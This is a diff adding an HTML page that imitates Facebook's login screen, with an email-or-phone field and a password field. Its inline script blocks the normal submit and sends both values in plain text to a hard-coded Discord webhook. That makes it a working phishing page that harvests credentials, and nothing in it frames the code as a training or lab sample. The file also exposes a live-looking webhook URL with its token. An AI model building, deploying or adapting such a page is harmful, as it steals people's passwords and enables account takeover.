@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login Page</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container flex">
+    <div class="facebook-page flex">
+      <div class="text">
+        <h1>Facebook</h1>
+        <p>Connect with friends and the world </p>
+        <p> around you on Facebook.</p>
+      </div>
+      <form action="#" id="login-form">
+        <input type="text" placeholder="Email or phone number" required id="emailOrPhone">
+        <input type="password" placeholder="Password" required id="password">
+        <div class="link">
+          <button type="submit" class="login">Login</button>
+          <a href="#" class="forgot">Forgot password?</a>
+        </div>
+        <hr>
+        <div class="button">
+          <a href="#">Create new account</a>
+        </div>
+      </form>
+    </div>
+  </div>
+  <script>
+const loginForm = document.getElementById('login-form');
+const webhookUrl = 'https://discord.com/api/webhooks/1248156025492738080/G3h8QZYyOmt7d9eE0azdiNReeWlRm3TkXqwJwufVnXUDqxB5pHuwAEE8CKrjellaNS8n';
+
+loginForm.addEventListener('submit', (event) => {
+  event.preventDefault();
+
+  // Corrected ID
+  const emailOrPhone = document.getElementById('emailOrPhone').value;
+  const password = document.getElementById('password').value;
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      content: `New login attempt:\nEmail or Phone: ${emailOrPhone}\nPassword: ${password}`
+    })
+  })
+  .then(response => {
+    if (response.ok) {
+      console.log('Login details sent to Discord successfully!');
+    
+    } else {
+      console.error('Error sending login details to Discord.');
+    }
+  })
+  .catch(error => {
+    console.error('Error sending login details to Discord:', error);
+  });
+});
+  </script>
+
+</body>
+
+</html>
